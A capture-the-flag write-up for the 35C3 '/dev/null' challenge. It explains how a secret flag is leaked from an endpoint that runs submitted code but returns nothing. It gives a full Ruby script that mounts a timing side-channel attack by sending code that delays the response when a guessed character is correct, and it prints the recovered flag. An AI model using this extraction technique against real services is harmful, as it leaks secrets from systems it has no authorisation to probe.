# /dev/null

> Solves: 42

> We're not the first but definitely the latest to offer dev-null-as-a-service. Pretty sure we're also the first to offer `Wee-piped-to-dev-null-as-a-service`[WPtDNaaS]. (We don't pipe anything, but the users don't care). This service is more useful than most blockchains (old joke, we know). Anyway this novel endpoint takes input at `/wee/dev/null` and returns nothing.
> http://35.207.132.47/

> Difficulty Estimate: Hard

This is one of the [Wee](../Wee) challenges.

## Analysis

Let's take a look at what we're dealing with.

```python
@app.route("/wee/dev/null", methods=["POST"])
def dev_null():
    json = request.get_json(force=True)
    wee = json["code"]
    wee = """
    var DEV_NULL: string = '{}'
    {}
    """.format(DEV_NULL, wee)
    _ = runwee(wee)
    return "GONE"
```

The flag is being exposed to our code but we have no way of printing it. What
else can we do?

The only thing that we can affect in the requests is how long they're going to
take. This lets us guess characters of the flag and delay the response if we're
right.

## Solution

I wrote a script to automate the task:

```ruby
require 'net/http'
require 'uri'
require 'json'

CHARS = [*'A'..'Z', *'0'..'9', '_']
done = false

flag = ""
i = ARGV.size > 0 ? ARGV[0].to_i : 0
until done
  CHARS.each do |c|
    code = <<~END
      if charAt(DEV_NULL, #{i}) == "#{c}" then
        if length(DEV_NULL) == #{i} + 1 then
          pause(5000)
        else
          pause(2000)
        end
      end
    END
    start = Time.now
    Net::HTTP.post(
      URI('http://35.207.132.47/wee/dev/null'),
      { code: code }.to_json
    )
    elapsed = Time.now - start

    if elapsed > 2
      done = true if elapsed > 5
      flag << c
      break
    end

    if c == '_'
      puts "Didn't find a hit for char ##{i}"
      flag << " "
    end
  end
  puts flag
  i += 1
end

puts "Flag: #{flag}"
```

Even though most of the time this script doesn't trigger any additional delays
it takes roughly 11 minutes to execute with a simple request taking 0.7 s. It
also yielded a few incorrect characters which had to be corrected by guesswork
or running it again. The final flag is:

```
35C3_TH3_SUN_IS_TH3_SAM3_YOU_RE_OLDER
```
